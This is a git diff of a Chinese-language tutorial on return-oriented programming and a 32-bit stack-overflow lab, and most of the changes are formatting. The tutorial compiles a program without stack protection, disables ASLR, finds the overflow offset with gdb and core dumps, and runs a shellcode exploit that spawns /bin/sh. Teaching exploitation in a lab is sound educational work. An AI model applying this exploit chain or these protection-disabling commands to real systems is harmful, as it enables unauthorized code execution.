@@ -17,14 +17,14 @@ ROP的全称为Return-oriented programming（返回导向编程），这是一�
 比较常见的程序流劫持就是栈溢出，格式化字符串攻击和堆溢出了。通过程序流劫持，攻击者可以控制PC指针从而执行目标代码。为了应对这种攻击，系统防御者也提出了各种防御方法，最常见的方法有DEP（堆栈不可执行），ASLR（内存地址随机化），Stack Protector（栈保护）等。<br>
 首先我们先关闭这些保护措施来实施一次攻击（c语言代码在linux_86,level1中）其中-fno-stack-protector关掉Stack Protector，-z execstack关掉DEP<br>
 $ gcc -fno-stack-protector -z execstack  -m32 -o level1 level1.c<br>
-注意：因为ubuntu16.04是64位系统在编译 -m32 时会报错，因为需要安装安装库文件sudo apt-get install gcc-4.8-multilib g++-4.8-multilib<br>
+注意：因为ubuntu16.04是64位系统在编译 -m32 时会报错，因为需要安装安装库文件sudo apt-get install gcc-4.8-multilib g++-4.8-multilib<br><br>
 执行以下指令ASLR保护<br>
 $ sudo -s<br>
 $ echo 0 > /proc/sys/kernel/randomize_va_space<br>
-$ exit<br>
-利用pattern.py脚本来寻找溢出点<br>
+$ exit<br><br>
+我们利用pattern.py脚本来寻找溢出点<br>
 $ python pattern.py create 150得到<br>
-Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9<br>
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9<br><br>
 使用gdb调试level1<br>
 $ gdb ./level1<br>
 （gdb)run 得到<br>
@@ -34,32 +34,32 @@ Program received signal SIGSEGV, Segmentation fault.<br>
 我们可以得知内存出错的地址为0x37654136，通过pattern.py脚本可以知道溢出点位置<br>
 $ python pattern.py offset 0x37654136 得到<br>
 hex pattern decoded as: 6Ae7<br>
-140<br>
+140<br><br>
 PC覆盖的溢出点为140字节处，我们只需要构造一个“A”*140+ret(返回地址）的字符串就可以让PC执行ret上的代码了，这里使用execve ("/bin/sh")命令的语句作为shellcode，这个可以打开一个终端（见linux_86 exp1.py)。原理如下所示：<br>
 [shellcode][“AAAAAAAAAAAAAA”….][ret]<br>
 ^------------------------------------<br>
-但在现实攻击中shellcode地址的位置并非这么简单。因为在gdb的调试环境会影响buf在内存中的位置，虽然我们关闭了ASLR，但这只能保证buf的地址在gdb的调试环境中不变，但当我们直接执行./level1的时候，buf的位置会固定在别的地址上。因此不能通过使用gdb调试目标程序，然后查看内存来确定shellcode的位置。<br>
+但在现实攻击中shellcode地址的位置并非这么简单。因为在gdb的调试环境会影响buf在内存中的位置，虽然我们关闭了ASLR，但这只能保证buf的地址在gdb的调试环境中不变，但当我们直接执行./level1的时候，buf的位置会固定在别的地址上。因此不能通过使用gdb调试目标程序，然后查看内存来确定shellcode的位置。<br><br>
 为了解决这个问题可以开启core dump，当程序内存出现错误的时候系统会生成一个core dump文件在tmp目录下，用gdb调试core文件就可以获取到真实的地址。<br>
 $ ulimit -c unlimited<br>
-$ sudo sh -c 'echo "/tmp/core.%t" > /proc/sys/kernel/core_pattern'<br>
+$ sudo sh -c 'echo "/tmp/core.%t" > /proc/sys/kernel/core_pattern'<br><br>
 $ ./level1 得到<br>
 ABCDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
 段错误 (核心已转储)<br>
-（可以先进入cd /tmp，然后ls查看core文件名称）
+（可以先进入cd /tmp，然后ls查看core文件名称）<br>
 $ gdb level1 /tmp/core.1545029320<br>
 Program terminated with signal SIGSEGV, Segmentation fault.<br>
 #0  0x41414141 in ?? ()<br>
 通过gdb的命令 “x/10s $esp-144”，我们可以得到buf的地址为0xbffffd000<br>
 (gdb) x/10s $esp -144<br>
 0xffffd000:	"ABCD", 'A' <repeats 140 times>, "\nS\373\367\260\320\377\377"<br>
-0xffffd099:	""<br>
+0xffffd099:	""<br><br>
 执行python脚本完成攻击：<br>
 $ python exp1.py<br>
 [+] Starting local process './level1': pid 14146<br>
 [*] Switching to interactive mode<br>
 $ whoami<br>
 [用户名] （得到你的用户名则是攻击成功了，如果攻击失败，应该是ret地址出错<br><br>
-
+![avatar](/Users/maoguai/Desktop/learning/eip.gif)br>
 
 ### 如何进行远程调试
 关闭地址随机化<br>
